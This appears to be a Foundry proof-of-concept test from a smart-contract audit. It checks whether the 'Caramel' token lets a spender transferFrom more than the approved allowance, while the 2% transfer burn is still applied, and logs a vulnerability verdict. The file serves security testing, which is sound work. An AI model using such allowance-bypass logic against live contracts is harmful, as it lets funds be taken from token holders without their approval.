// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Caramel.sol";

contract CaramelTest is Test {
    Caramel token;
    address owner = address(0x1);
    address alice = address(0x2);
    address bob = address(0x3);
    address carol = address(0x4);

    function setUp() public {
        vm.startPrank(owner);
        token = new Caramel();
        token.mint(alice, 1000 * 10**18);
        vm.stopPrank();
    }

    function testTransferFromExceedsAllowance() public {
        uint256 amountToTransfer = 100 * 10**18;
        uint256 expectedBurn = 2 * 10**18; // 2% of 100 tokens

        // Alice approves Bob to spend only 98 tokens
        vm.prank(alice);
        token.approve(bob, 98 * 10**18);

        // Record initial balances
        uint256 initialAliceBalance = token.balanceOf(alice);
        uint256 initialCarolBalance = token.balanceOf(carol);
        uint256 initialTotalSupply = token.totalSupply();

        console.log("--- BEFORE-Trigger Transfer ---");
        console.log("Alice balance:", initialAliceBalance);
        console.log("Carol balance:", initialCarolBalance);
        console.log("Total supply:", initialTotalSupply);
        console.log("Allowance:", token.allowance(alice, bob));

        console.log(""); 
        console.log("--- Trigger TransferFrom ---");
        console.log("Bob attempts to transfer 100 tokens from Alice to Carol");
        console.log("");

        // Attempt transfer
        bool transferSuccess;
        bytes memory data;
        vm.prank(bob);
        (transferSuccess, data) = address(token).call(
            abi.encodeWithSelector(
                token.transferFrom.selector,
                alice, 
                carol, 
                amountToTransfer
            )
        );

        console.log("--- AFTER-Trigger Transfer ---");
        uint256 aliceBalanceAfter = token.balanceOf(alice);
        uint256 carolBalanceAfter = token.balanceOf(carol);
        uint256 totalSupplyAfter = token.totalSupply();
        
        console.log("Alice balance:", aliceBalanceAfter);
        console.log("Carol balance:", carolBalanceAfter);
        console.log("Total supply:", totalSupplyAfter);

        bool vulnerabilityExists = false;
        string memory reason;

        if(!transferSuccess) {
            vulnerabilityExists = false;
            reason = "Transfer reverted as expected (allowance enforced)";
        } else {
            uint256 aliceLoss = initialAliceBalance - aliceBalanceAfter;
            uint256 carolGain = carolBalanceAfter - initialCarolBalance;
            uint256 supplyReduction = initialTotalSupply - totalSupplyAfter;

            console.log("Alice tokens lost:", aliceLoss);
            console.log("Carol tokens gained:", carolGain);
            console.log("Total tokens burned:", supplyReduction);

            // Verify vulnerability conditions
            if (aliceLoss == amountToTransfer && 
                carolGain == (amountToTransfer - expectedBurn) &&
                supplyReduction == expectedBurn) {
                vulnerabilityExists = true;
                reason = "Transfer exceeded approved amount without revert";
            } else {
                vulnerabilityExists = false;
                reason = "State changes don't match vulnerability pattern";
            }
        }

        // Final verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists:", reason);
        } else {
            console.log("Vulnerability not Exist:", reason);
        }
    }
}